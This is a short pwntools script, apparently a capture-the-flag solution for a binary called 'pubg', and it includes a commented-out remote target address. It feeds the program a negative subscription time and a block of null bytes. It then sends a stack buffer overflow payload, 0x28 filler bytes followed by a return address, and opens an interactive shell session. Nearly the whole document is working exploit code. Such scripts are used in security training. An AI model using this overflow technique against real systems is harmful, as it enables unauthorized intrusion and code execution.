from pwn import *
context.log_level = 'debug'

sh =process('./pubg')
#sh=remote('159.65.68.241','9001')
libc = ELF('./pubg')


sh.recv()
sh.sendline('2')
sh.recvuntil('subscripton time(days):\n')
sh.sendline(str(-1))
sh.recvuntil("invitation code:\n")
sh.send('\x00'*0x10)
sh.recv()
#gdb.attach(sh)

sh.send('a'*0x28+p64(0x401bed))
sh.interactive()
